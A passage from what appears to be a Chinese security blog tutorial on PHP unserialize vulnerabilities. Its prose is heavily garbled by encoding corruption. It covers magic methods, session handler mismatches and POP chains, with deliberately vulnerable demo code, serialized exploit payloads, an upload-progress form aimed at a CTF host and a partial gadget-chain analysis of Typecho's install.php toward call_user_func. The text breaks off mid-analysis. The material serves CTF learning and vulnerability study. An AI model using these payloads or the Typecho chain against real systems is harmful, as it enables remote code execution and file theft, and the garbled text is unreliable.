- null1N; 2.phpÂØπË±°Â∏∏ËßÅÁöÑÈ≠îÂπªÂáΩÊï∞ __constructÔºö Âú®ÂàõÂª∫ÂØπË±°Êó∂ÂÄôÂàùÂßãÂåñÂØπË±°Ôºå‰∏ÄËà¨Áî®‰∫éÂØπÂèòÈáèËµãÂàùÂÄº„ÄÇ __destructÔºö ÂíåÊûÑÈÄ†ÂáΩÊï∞Áõ∏ÂèçÔºåÂΩìÂØπË±°ÊâÄÂú®ÂáΩÊï∞Ë∞ÉÁî®ÂÆåÊØïÂêéÊâßË°å„ÄÇ __toStringÔºöÂΩìÂØπË±°Ë¢´ÂΩìÂÅö‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ë∞ÉÁî®„ÄÇ __sleep:Â∫èÂàóÂåñÂØπË±°‰πãÂâçÂ∞±Ë∞ÉÁî®Ê≠§ÊñπÊ≥ï(ÂÖ∂ËøîÂõûÈúÄË¶Å‰∏Ä‰∏™Êï∞ÁªÑ) __wakeup:ÂèçÂ∫èÂàóÂåñÊÅ¢Â§çÂØπË±°‰πãÂâçË∞ÉÁî®ËØ•ÊñπÊ≥ï __call:ÂΩìË∞ÉÁî®ÂØπË±°‰∏≠‰∏çÂ≠òÂú®ÁöÑÊñπÊ≥ï‰ºöËá™Âä®Ë∞ÉÁî®ËØ•ÊñπÊ≥ï„ÄÇ __get:Âú®Ë∞ÉÁî®ÁßÅÊúâÂ±ûÊÄßÁöÑÊó∂ÂÄô‰ºöËá™Âä®ÊâßË°å Êõ¥Â§öËßÅÔºöhttps://php.net/manual/zh/language.oop5.magic.php ÊµãËØïÔºö 3.php_sessionÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñÁõ∏ÂÖ≥Áü•ËØÜ3.1 php_sessionÂ§ÑÁêÜÂô® php_binary:Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêçÁöÑÈïøÂ∫¶ÂØπÂ∫îÁöÑASCIIÂ≠óÁ¨¶+ÈîÆÂêç+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄº php:Â≠òÂÇ®ÊñπÂºèÊòØÔºåÈîÆÂêç+Á´ñÁ∫ø+ÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂ§ÑÁêÜÁöÑÂÄº„ÄÇ php_serialize(php&gt;5.5.4):Â≠òÂÇ®ÊñπÂºèÊòØÔºåÁªèËøáserialize()ÂáΩÊï∞Â∫èÂàóÂåñÂ§ÑÁêÜÁöÑÂÄºËÆæÁΩÆÊñπÂºèÔºöÂú®php_ini‰∏≠session.serialize_handler(PHP_INI_ALL) ËÆæÁΩÆÔºå‰πüÂèØ‰ª•Âú®‰ª£Á†Å‰∏≠ËÆæÁΩÆÔºö1ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); ÂêÑÁ±ªÂ≠òÂÇ®ÊñπÂºèÁ§∫‰æãÔºö‰ª£Á†ÅÔºö123456&lt;?phpini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);?&gt; ÂΩìÊàë‰º†ÂÖ•?a=O:4:‚Äùpass‚Äù:0:{}Êó∂Ôºö phpÂ§ÑÁêÜÂô®Â≠òÂÇ®ÁöÑ‰∏∫Ôºöa|s:15:‚ÄùO:4:‚Äùpass‚Äù:0:{}‚Äù; php_serializeÂ§ÑÁêÜÂô®Â≠òÂÇ®ÁöÑ‰∏∫Ôºöa:1:{s:1:‚Äùa‚Äù;s:15:‚ÄùO:4:‚Äùpass‚Äù:0:{}‚Äù;} php_binaryÂ§ÑÁêÜÂô®Â≠òÂÇ®ÁöÑ‰∏∫Ôºö(‰π±Á†Å‰∫Ü..Ëá™Â∑±ÊµãËØïÂêß) 3.2.php_ini‰∏≠‰∏éphp_sessionÁõ∏ÂÖ≥ÁöÑÈÖçÁΩÆÁü•ËØÜ session.save_path = ‚Äú‚Äù //ËÆæÁΩÆsessionÁöÑÂ≠òÂÇ®Ë∑ØÂæÑ session.auto_start = boolen //ÊåáÂÆö‰ºöËØùÊ®°ÂùóÊòØÂê¶Âú®ËØ∑Ê±ÇÂºÄÂßãÊó∂ÂêØÂä®‰∏Ä‰∏™‰ºöËØùÔºåÈªòËÆ§0(‰∏çÂêØÂä®) session.serialize_handler = string //ÊåáÂÆöÂ∫èÂàóÂåñ„ÄÅÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜÂô® 0x02.Â∏∏ËßÅÁöÑÊºèÊ¥ûÔºö1 Â∞Ü‰º†Êù•ÁöÑÂ∫èÂàóÂåñunserilizeÔºåÈÄ†ÊàêÈ≠îÂπªÂáΩÊï∞ÊâßË°å„ÄÇdemo1Ôºö Áî±bugkuÁöÑ‰∏Ä‰∏™È¢òÂêØÂèëËÄåÂÜôÁöÑ‰∏Ä‰∏™Áº©Áï•ÁâàÁöÑdemoÔºåÂéüÈ¢òÈìæÊé•Ôºöhttps://120.24.86.145:8006/test1/ 1234567891011121314&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$password = unserialize($_GET['password']); echo $password; &lt;/script&gt; ÂÖ≥ÈîÆÁÇπÔºöÂΩìÂØπË±°Ë¢´ÂΩì‰ΩúÂ≠óÁ¨¶‰∏≤‰ΩøÁî®Êó∂Ë∞ÉÁî®__tostring()È≠îÂπªÂáΩÊï∞ÔºåÊâÄ‰ª•Â¶ÇÊûúÊàë‰ª¨Áªôpassword‰º†ÂÖ•‰∏Ä‰∏™Â∫èÂàóÂåñÁöÑÂØπË±°ÔºåÈÇ£‰πàecho $password Â∞±‰ºöË∞ÉÁî®È≠îÂπªÂáΩÊï∞„ÄÇÊûÑÈÄ†payloadÔºö123456789101112131415&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br /&gt;"; return ("good"); &#125; &#125;&#125;$obj = new Flag();$obj-&gt;file = "Flag.php"; echo serialize($obj);&lt;/script&gt; ÁîüÊàêÔºö1O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; ÊúÄÂêéËØªÂá∫flag.php demo2:1234567891011&lt;script language="php"&gt;class Flag&#123; //flag.php public $file; public function __wakeup()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; &#125;&#125;unserialize($_GET['password']); &lt;/script&gt; Ëøô‰∏™‰æãÂ≠êÊòØÂà©Áî®ÁöÑÂèçÂ∫èÂàóÂåñÊÅ¢Â§çÂØπË±°‰πãÂâç‰ºöË∞ÉÁî®__wakeup()ÔºåÊâÄ‰ª•ÊûÑÈÄ†payloadÊñπÊ≥ïÂíådemo1‰∏≠‰∏ÄÊ†∑„ÄÇÂ∞ÜÊãøÂà∞ÁöÑÂ∫èÂàóÂåñÂ≠óÁ¨¶‰º†ÂÖ•Ôºö1https://localhost:9096/test1.php?password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; Âç≥ÂèØÂæóÂà∞flag.php‰∏≠ÁöÑÊñá‰ª∂ ÂΩìÁÑ∂ËøòÊúâÂÖ∂‰ªñÈ≠îÂπªÂáΩÊï∞Ôºö__construct„ÄÅ__destructÈÉΩË°å ÊÄªÁöÑÊù•ËØ¥Ôºö‚ë†ÔºöÊúâÂèØÊéßÁöÑÊï∞ÊçÆË¢´ÂèçÂ∫èÂàóÂåñ‚ë°ÔºöÊúâÈ≠îÂπªÂáΩÊï∞‰∏≠ÊïèÊÑü‰ª£Á†ÅË¢´ÊâßË°å„ÄÇ 2 php sessionÂ§ÑÁêÜÂô®ËÆæÁΩÆ‰∏çÂΩìÁöÑÊºèÊ¥û„ÄÇ Ëµ∑Ê∫ê‰∫é‰∏ÄÈÅìCTFÔºåÈ¢òÁõÆ‰º†ÈÄÅÈó®:https://web.jarvisoj.com:32784/ È¢òÁõÆÊ∫êÁ†ÅÔºö12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; Á¨¨‰∏ÄÁúºÁúãÂà∞Ëøô‰∏™È¢òÁöÑÊó∂ÂÄôÂæàÊáµÈÄº‚Ä¶. Ê≤°ÊúâÊï∞ÊçÆÂèØ‰ª•ËæìÂÖ•ÁöÑÂú∞Êñπ‚Ä¶ÁÑ∂ÂêéÁê¢Á£®‰∫Ü‰∏Ä‰∏ãwp‚Ä¶.. ÊÑüËßâÂèëÁé∞‰∫ÜÊñ∞Â§ßÈôÜ‚Ä¶ ‰ªéphpinfo‰∏≠ÂèØ‰ª•ÂèëÁé∞1session.serialize_handler = php_serilize ËÄå‰ª£Á†Å‰∏≠ËÆæÁΩÆÁöÑ1ini_set('session.serialize_handler', 'php'); ‰ªé‰∏äÊñá‰ªãÁªçÁõ∏ÂÖ≥Â§ÑÁêÜÂô®ÁöÑÊó∂ÂÄôÂèØ‰ª•Áü•ÈÅìÔºöPHPÂ§ÑÁêÜÂô®Ôºöa‰∏∫sessionÁöÑÈîÆÂêçÔºå|ÂêéÈù¢‰∏∫ÁªèËøáserializeÂ§ÑÁêÜÁöÑÈîÆÂÄºËÄåphp_serializeÂ§ÑÁêÜÂô®ÔºöËøôÂÖ∂‰∏≠php_serializeÊúâ‰∏Ä‰∏™ÁâπÊÄßÔºåÂ∞±ÊòØÂèØ‰ª•Âú®Â≠óÁ¨¶‰∏≤ÂèòÈáè‰∏≠ÂÇ®Â≠ò | Á¨¶Âè∑ÔºåÁÑ∂ÂêéÂΩìÊàë‰ª¨‰ª•php_serializeÊ†ºÂºèÂ≠òÂÖ•|O:4:‚Äùpass‚Äù:0:{}ÂÜç‰ª•phpÂ§ÑÁêÜÂô®Â§ÑÁêÜÔºöÂç≥ÂèòÊàê‰∫Ü[‚Äúa:1:{s:1:‚Äùa‚Äù;s:16:‚Äù‚Äù]‰∏∫ÈîÆÂêçÔºåtestÂØπË±°‰∏∫ÂÄº„ÄÇdemo3(‰∏äËø∞ËøáÁ®ãÂÖ∑‰ΩìÂÆûÁé∞‰ª£Á†Å)Ôºö12345&lt;?php//ini_set('session.serialize_handler', 'php');session_start();$_SESSION['a'] = $_GET['a'];?&gt; ÂÆûÁé∞Ê≠•È™§Ôºö1.ËÆæÁΩÆphp_ini‰∏≠ÁöÑsession.serialize_handler = php_serializeÔºåËÆøÈóÆhttps://localhost:9096/test1.php?a=|O:4:&quot;test&quot;:0:{},Âç≥ÂÜôÂÖ•session„ÄÇ2.Â∞Ü‰∏äËø∞‰ª£Á†ÅÊ≥®ÈáäÂéªÊéâÔºåÂπ∂Áªô$_SESSION[‚Äòa‚Äô] = $_GET[‚Äòa‚Äô];Âä†‰∏äÊ≥®ÈáäÔºåÂç≥ÂèØÁúãÂà∞phpÂíåphp_serializeÂ§ÑÁêÜ|ÁöÑÊºèÊ¥û„ÄÇ ÊâÄ‰ª•ËøôÈáåÂ∞±ÂèØ‰ª•Âà©Áî®Ëøô‰∏™ÁâπÊÄßÁªôÁΩëÈ°µ‰º†ÂÖ•‰∏Ä‰∏™ÊûÑÈÄ†ÁöÑphp_serializeÊ†ºÂºèÁöÑsessionÔºåÁÑ∂ÂêéËÆ©phpËß£ÊûêÂô®Â∞Ü|ÂêéÁöÑÊï∞ÊçÆËß£ÊûêÊàê‚ÄùÂÄº‚ÄùÔºå‰ª•ËææÂà∞‰ª£Á†ÅÊâßË°åÁõÆÁöÑ„ÄÇÁÑ∂ÂêéÊàë‰ª¨Âà©Áî®Ëøô‰∏™ÁâπÁÇπÂÜôÂÖ•‰∏Ä‰∏™session(‰ª•php_serializeÊ†ºÂºè)ÔºåÁÑ∂ÂêéËÆ©ËØ•È°µÈù¢‰ª•phpÊñπÂºèÂ§ÑÁêÜÔºå‰ªéËÄåÁªô$mdzzËµãÂÄºÔºåËé∑ÂèñÊïèÊÑü‰ø°ÊÅØ„ÄÇdemo4Ôºötest1.php123456789101112131415&lt;?phpini_set('session.serialize_handler', 'php');session_start();//$_SESSION['a'] = $_GET['a'];var_dump($_SESSION);class Test&#123; function __construct()&#123; echo "__constrct"; &#125; function __destruct()&#123; echo "__destruct"; eval(phpinfo()); &#125;&#125;?&gt; Êú¨Âú∞‰∫ãÂÖàÂ≠òÂÇ®‰∫Ü‰ª•php_serilizeÊ†ºÂºèÁöÑsessionÔºöa:1:{s:1:‚Äùa‚Äù;s:16:‚Äù|O:4:‚ÄùTest‚Äù:0:{}ÁÑ∂ÂêéËÆøÈóÆtest1.phpÊ≠£Â•ΩÁ¨¶Âêà‰∏äËø∞È¢òÁõÆ‰∏≠ÁöÑevalÂáΩÊï∞‰∏≠ÁöÑ‰ª£Á†ÅÊâßË°å ÊÄªÁöÑÊù•ËØ¥ ÔºöÂÖ∂ÂÆûËøôÁßçÊºèÊ¥ûÂ∞±ÊòØsessionÂ∫èÂàóÂåñÂèäÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜÂô®ËÆæÁΩÆ‰∏çÂΩìÈÄ†Êàê„ÄÇÊú¨Ë¥®‰∏äÊòØÂÆÉ‰ª¨ÂØπÂ§ÑÁêÜ‚Äú|‚ÄùÁöÑÂ∑ÆÂºÇÈÄ†Êàê„ÄÇÂ¶ÇÊûú‰ª•php_serilizeÊñπÂºèÂ≠òÂÖ•ÔºåÊØîÂ¶ÇÊàë‰ª¨ÊûÑÈÄ†Âá∫‚Äô|‚Äô ‰º™ÈÄ†ÁöÑÂ∫èÂàóÂåñÂÄºÂ≠òÂÖ•Ôºå‰ΩÜ‰πãÂêéËß£ÊûêÂèàÊòØÁî®ÁöÑphpÂ§ÑÁêÜÂô®ÁöÑËØùÔºåÈÇ£‰πàÂ∞Ü‰ºöÂèçÂ∫èÂàóÂåñ‰º™ÈÄ†ÁöÑÊï∞ÊçÆÔºà‚Äô|‚Äô‰πãÂâçÂΩì‰ΩúÈîÆÂêçÔºå‚Äô|‚Äô‰πãÂêéÂΩì‰ΩúÈîÆÂÄºÔºâÂÖ∂Ê¨°Â¶ÇÊûúÊÉ≥Ë¶ÅÂà©Áî®ÁöÑËØùÔºåÂ∞±ÊòØÊâæÂà∞Ê≥®ÂÖ•ÁÇπÔºåÂ∞ÜÊàë‰ª¨ÊûÑÈÄ†ÁöÑsessionÊ≥®ÂÖ•ËøõÂéª„ÄÇ ÂÖ∂ÂÆûÊàëËøòÊòØÊúâÁÇπÁñëÈóÆÁöÑÈÇ£‰πà‰∏∫‰ªÄ‰πàphpÂ§ÑÁêÜÂô®Â§ÑÁêÜÁöÑÊó∂ÂÄô‰ºöÊâßË°åsession‰∏≠ÁöÑÂÄºÂë¢ÔºüÁåúÊÉ≥Ôºö‰∏ésession_startÊàñËÄÖphpÂ§ÑÁêÜÂô®ÊúâÂÖ≥ÊöÇÊó∂ËøòÊ≤°ÊúâÊç£ÈºìÂá∫Êù•‚Ä¶ 0x03.Â¶Ç‰ΩïÂØªÊâæÊ≥®ÂÖ•ÁÇπÂ∞ÜÊï∞ÊçÆÊ≥®ÂÖ•Âà∞session‰∏äÈù¢ËØ¥ÁöÑÈÇ£‰∏™CTFÈ¢òÂéüÁêÜÂ∑≤ÁªèÁü•ÈÅì‰∫ÜÔºå‰ΩÜÊòØÂπ∂‰∏çÁü•ÈÅì‰ªéÂì™Ê≥®ÂÖ•session„ÄÇÂ∞±Êàë‰∫ÜËß£ÁöÑËÄåË®ÄÔºåÊúâ‰ª•‰∏ãÂá†ÁßçÂÜôÂÖ•sessionÁöÑÈÄîÂæÑ 1.ÈÄöËøáÈÖçÁΩÆ‰∏çÂΩìÈÄ†ÊàêÁöÑsessionÂèØÊéß ÂèÇËÄÉÔºöhttps://bugs.php.net/bug.php?id=71101ÂΩìÂú®php.ini‰∏≠ËÆæÁΩÆsession.upload_progress.enabled = OnÁöÑÊó∂ÂÄôÔºåPHPÂ∞ÜËÉΩÂ§üË∑üË∏™‰∏ä‰º†Âçï‰∏™Êñá‰ª∂ÁöÑ‰∏ä‰º†ËøõÂ∫¶„ÄÇÂΩì‰∏ä‰º†Ê≠£Âú®ËøõË°åÊó∂Ôºå‰ª•ÂèäÂú®Â∞Ü‰∏ésession.upload_progress.name INIËÆæÁΩÆÁõ∏ÂêåÁöÑÂêçÁß∞ÁöÑÂèòÈáèËÆæÁΩÆ‰∏∫POSTÊó∂Ôºå‰∏ä‰º†ËøõÂ∫¶Â∞ÜÂú®$ _SESSIONË∂ÖÂÖ®Â±Ä‰∏≠ÂèØÁî®„ÄÇ Êàë‰ª¨ÂêØÁî®‰∫ÜËØ•ÈÖçÁΩÆÈ°πÂêéÔºåPOST‰∏Ä‰∏™Âíåsession.upload_progress.nameÂêåÂêçÂèòÈáèÁöÑÊó∂ÂÄôPHP‰ºöÂ∞ÜÊñá‰ª∂Âêç‰øùÂ≠òÂú®$_SESSION‰∏≠ÊâÄ‰ª•ÊûÑÈÄ†‰∏Ä‰∏™Êèê‰∫§Êñá‰ª∂ÁöÑË°®ÂçïÔºö12345&lt;form action =‚Äúhttps://web.jarvisoj.com:32784/index.php‚Äùmethod =‚ÄúPOST‚Äùenctype =‚Äúmultipart/form-data‚Äù&gt; &lt;input type =‚Äúhidden‚Äùname =‚ÄúPHP_SESSION_UPLOAD_PROGRESS‚Äùvalue =‚Äú1‚Äù/&gt; &lt;input type =‚Äúfile‚Äùname =‚Äúfile‚Äù/&gt; &lt;input type =‚Äúsubmit‚Äù/&gt;&lt;/form&gt; ÁÑ∂ÂêéÊûÑÈÄ†‰∏Ä‰∏™Â∫èÂàóÂåñÁöÑÊï∞ÊçÆÔºö123456789&lt;?phpini_set('session.serialize.handler','php');session_start();class OowoO&#123; public $mdzz = 'payload';&#125;$obj = new OowoO();echo serialize($obj);?&gt; Âç≥ÂèØ‰ΩøÂæóÊûêÊûÑÂáΩÊï∞‰∏≠ÁöÑeval()ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ 0x04ÔºöÊûÑÈÄ†Ê≥®ÂÖ•ÈìæÔºöpop1.POPÈìæÂéüÁêÜÁÆÄ‰ªãÔºö Âú®ÂèçÂ∫èÂàóÂåñ‰∏≠ÔºåÊàë‰ª¨ËÉΩÊéßÂà∂ÁöÑÊï∞ÊçÆÂ∞±ÊòØÂØπË±°‰∏≠ÁöÑÂ±ûÊÄßÂÄºÔºåÊâÄ‰ª•Âú®PHPÂèçÂ∫èÂàóÂåñ‰∏≠Êúâ‰∏ÄÁßçÊºèÊ¥ûÂà©Áî®ÊñπÊ≥ïÂè´‚ÄùÈù¢ÂêëÂ±ûÊÄßÁºñÁ®ã‚ÄùÔºåÂç≥POP( Property Oriented Programming)„ÄÇÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®‰∏≠ÔºåÊúÄÁêÜÊÉ≥ÁöÑÊÉÖÂÜµÂ∞±ÊòØÊºèÊ¥ûËÉΩÂà©Áî®ÁöÑÁÇπÂú®ÈÇ£Âá†‰∏™È≠îÂπªÂáΩÊï∞‰∏≠ÔºåËÄåÂÆûÈôÖ‰∏äÂæÄÂæÄÊòØ‰ªéËøôÂá†‰∏™È≠îÂπªÂáΩÊï∞ÂºÄÂßãÔºåÈÄêÊ≠•ÁöÑË∑üËøõËøô‰∏™ÂáΩÊï∞‰∏≠Ë∞ÉÁî®ÁöÑÂáΩÊï∞ÔºåÁõ¥Âà∞ÊâæÂà∞ÂèØ‰ª•Âà©Áî®ÁöÑÁÇπ„ÄÇ ËØïÊÉ≥‰∏Ä‰∏ãÔºåÂ¶ÇÊûú‰∏äÈù¢ÈÇ£‰∏™CTFÈ¢òÁõÆÁöÑ‰ª£Á†ÅÊâßË°åÂáΩÊï∞eval()ÂáΩÊï∞‰∏çÂú®__destructËøôÁ±ªÈ≠îÂπªÂáΩÊï∞‰∏≠ÔºåËÄåÊòØÂú®‰∏Ä‰∏™ÊôÆÈÄöÁöÑÊñπÊ≥ï‰∏≠ÔºåÊàë‰ª¨Â∞±Ê≤°ÂäûÊ≥ïÁõ¥Êé•Âà©Áî®ÂÆÉÊâßË°å‰ª£Á†Å‰∫Ü„ÄÇËøô‰∏™Êó∂ÂÄôÂ∞±ÈúÄË¶ÅÊûÑÈÄ†‰∏Ä‰∏™ÈìæÔºåÈìæÊé•Âà∞Êàë‰ª¨ÈúÄË¶ÅÊâßË°åÁöÑÂáΩÊï∞eval()„ÄÇ demo5(Ê®°Êãü‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂú∫ÊôØ)Ôºö12345678910111213141516171819202122232425&lt;?phpclass OowoO&#123; protected $obj; function __destruct() &#123; //$obj = new test1; ËøôÈáåÂèØ‰ª•ÊéßÂà∂$obj‰∏∫‰ªªÊÑèÂØπË±° $this-&gt;obj-&gt;a(); &#125;&#125;class test1&#123; function a()&#123; echo "123"; &#125;&#125;class test2&#123; private $data; function a()&#123; eval($this-&gt;data); &#125;&#125;unserialize($_GET['a']);?&gt; Âà©Áî®Ôºö12345678910111213&lt;script language="php"&gt;class OowoO&#123; protected $obj; public function __construct()&#123; $this-&gt;obj = new test2(); &#125;&#125;class test2&#123; private $data = "phpinfo();";&#125;echo urlencode(serialize(new OowoO()));&lt;/script&gt; ÁªìÊûúÔºö ÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÂèçÂ∫èÂàóÂåñÂèØ‰ª•ÊéßÂà∂Á±ªÁöÑÂ±ûÊÄßÔºåÊó†ËÆ∫privateËøòÊòØpublic„ÄÇ‰ΩÜÊòØËøôÈáåÊúâ‰∏™ÂùëÔºåÂ¶ÇÊûúÁ±ª‰∏≠Â≠òÂú®protectedÊàñËÄÖprivateÂ±ûÊÄßÁöÑÊó∂ÂÄôÔºåÂ∫èÂàóÂåñÁöÑÊó∂ÂÄô‰ºö‰∫ßÁîüÁ©∫Â≠óËäÇÔºåÊâÄ‰ª•ËÆ∞Âæóurlencode‰∏Ä‰∏ãÔºåpayloadÊâç‰ºöÁîüÊïà„ÄÇdemo6Ôºö123456789&lt;?phpclass test&#123; private $a="a"; protected $b="b"; public $c="c";&#125;echo urlencode(serialize(new test()));?&gt; ÊÄªÁöÑÊù•ËØ¥ÔºöÂ¶ÇÊûúÈ≠îÂπªÂáΩÊï∞‰∏≠Ê≤°ÊúâÊºèÊ¥ûÂà©Áî®ÁÇπÔºå‰ΩÜÊòØ‰ªñË∞ÉÁî®‰∫ÜÂÖ∂‰ªñÂØπË±°(ÊÑèÂë≥ÁùÄÂÆû‰æãÂåñ‰∫ÜËØ•ÂØπË±°)‰∏≠ÁöÑÊñπÊ≥ïAÔºåÁî±‰∫é‰∏äËø∞demo5‰∏≠Êàë‰ª¨‰º†ÂÖ•ÁöÑÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÂèØ‰ª•ÂÆû‰æãÂåñ‰ªªÊÑèÂØπË±°ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂÖ®Â±ÄÂØªÊâæ‰∏Ä‰∏™ÂíåÊñπÊ≥ïAÂêåÂêçÁöÑÊñπÊ≥ïÔºåÁÑ∂ÂêéÈÄê‰∏™Êü•ÁúãÂÖ∂‰ªñÂêåÂêçÊñπÊ≥ïA‰∏≠ÊòØÂê¶Âê´ÊúâÂèØÂà©Áî®ÁöÑÁÇπ„ÄÇ 2.typechoÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûêÔºöÊºèÊ¥ûÊñá‰ª∂‰∏∫Ê†πÁõÆÂΩï‰∏ãÁöÑinstall.phpÔºåÁ¨¨283Ë°å:12345$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));$type = explode('_', $config['adapter']);$type = array_pop($type);$installDb = new Typecho_Db($config['adapter'], $config['prefix']);$installDb-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); ‰ªécookie‰∏≠Â∞Ü__typecho_configÁöÑÂÄºÂèñÂá∫ÔºåÁÑ∂ÂêéÂú®Typecho_Db‰∏≠ÂÆû‰æãÂåñ„ÄÇËøôÈáåÂ∞±ÊòØÊºèÊ¥ûÁöÑÊ≥®ÂÖ•ÁÇπÔºå‰∏ãÈù¢Â∞±ÈúÄË¶ÅÊâæÂà∞ÊºèÊ¥ûÁöÑÂà©Áî®ÁÇπÔºåÊé•ÁùÄÊêúÂØªÈ≠îÂπªÂáΩÊï∞ __construct„ÄÅ__destruct„ÄÅ__wakeup„ÄÇ Âú®/var/Typecho/Db.php‰∏≠Typecho_DbÁ±ªÔºå‰ª£Á†ÅÁ¨¨114Ë°åÔºåÊâæÂà∞‰∏Ä‰∏™__construct(1)ÂèØ‰ª•Âà©Áî®ÔºåÂõ†‰∏∫$adapterNameÂèòÈáèÂ≠òÂú®Â≠óÁ¨¶‰∏≤ÊãºÊé•Â¶ÇÊûúÁªôÂÆÉÂèçÂ∫èÂàóÂåñ‰º†ÂÖ•‰∏Ä‰∏™ÂØπË±°ÁöÑËØùÔºå‰ºöË∞ÉÁî® __tostringÂáΩÊï∞(Â¶ÇÊûúÂ≠òÂú®ÁöÑËØù)„ÄÇ1234public function __construct($adapterName, $prefix = 'typecho_')&#123; $this-&gt;_adapterName = $adapterName; $adapterName = 'Typecho_Db_Adapter_' . $adapterName; ÂèØ‰ª•ÂèëÁé∞Âú®ÂêåÊñá‰ª∂‰∏ãÁöÑÁ¨¨134Ë°åÔºåÂÆû‰æãÂåñ‰∫Ü$adapterNameÔºå‰ºöË∞ÉÁî®__tostring(2)1$this-&gt;_adapter = new $adapterName(); ÂÖ®Â±ÄÊêúÁ¥¢__tostringÂêéÔºåÂú®/var/Typecho/Feed.php‰∏≠Typecho_FeedÁ±ªÂèØ‰ª•ÂèëÁé∞__tostring(2)ÊñπÊ≥ïÔºö290Ë°åÔºö1234567891011foreach ($this-&gt;_items as $item) &#123; $content .= '&lt;entry&gt;' . self::EOL; $content .= '&lt;title type="html"&gt;&lt;![CDATA[' . $item['title'] . ']]&gt;&lt;/title&gt;' . self::EOL; $content .= '&lt;link rel="alternate" type="text/html" href="' . $item['link'] . '" /&gt;' . self::EOL; $content .= '&lt;id&gt;' . $item['link'] . '&lt;/id&gt;' . self::EOL; $content .= '&lt;updated&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/updated&gt;' . self::EOL; $content .= '&lt;published&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/published&gt;' . self::EOL; $content .= '&lt;author&gt;&lt;name&gt;' . $item['author']-&gt;screenName . '&lt;/name&gt;&lt;uri&gt;' . $item['author']-&gt;url . '&lt;/uri&gt;&lt;/author&gt;' . self::EOL; Âú®ËØ•ÊÆµ‰ª£Á†ÅÁöÑÂÄíÊï∞Á¨¨‰∏âË°å‰∏≠ÔºåÂ¶ÇÊûúÊûÑÈÄ†$item[‚Äòauthor‚Äô]ÊòØ‰∏Ä‰∏™ÂØπË±°ÔºåscreenNameÊòØÂÖ∂ÁßÅÊúâÂ±ûÊÄßÔºåÂàô‰ºöË∞ÉÁî®__get(3)ÊñπÊ≥ï„ÄÇ ÁÑ∂ÂêéÂú®/var/Typecho/Request.php‰∏≠Typecho_RequestÁ±ª‰∏≠ __get(3)ÊñπÊ≥ïÔºö226Ë°å1234public function __get($key)&#123; return $this-&gt;get($key);&#125; Ë∞ÉÁî®‰∫ÜgetÊñπÊ≥ïÔºö295Ë°å1234567891011121314151617public function get($key, $default = NULL)&#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value);&#125; Ë∑üËøõ‰∏Ä‰∏ã_applyFilter(),Âú®ËØ•Êñá‰ª∂ÁöÑ159Ë°å:1234567private function _applyFilter($value)&#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; Ë∞ÉÁî®‰∫Ücall_user_func($filter,$value)ÂáΩÊï∞ÔºåÊâæÂà∞‰∫ÜÂèØ‰ª•Âà©Áî®ÁöÑÁÇπ‰∫Ü„ÄÇ ÂèçËøáÊù•ÂàÜÊûêÔºöÂõûÊ∫ØÊü•Áúã‰∏Ä‰∏ã$valueÂèòÈáèÁöÑÊù•Ê∫êÔºöÁî±Typecho_RequestÁ±ª‰∏≠ÁöÑ$_params‰º†ÂÖ•„ÄÇÁÑ∂Âêé$filterÂú®‰ª£Á†ÅÁöÑ120Ë°åÊúâÂÆö‰πâÔºö1private $_filter = array(); ÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÂØπËØ•Â±ûÊÄßËµãÂÄº„ÄÇ ÂÜçÊù•ËÄÉËôë‰∏Ä‰∏ãÂ¶Ç‰ΩïËß¶Âèë__get(3)ÊñπÊ≥ïÔºö 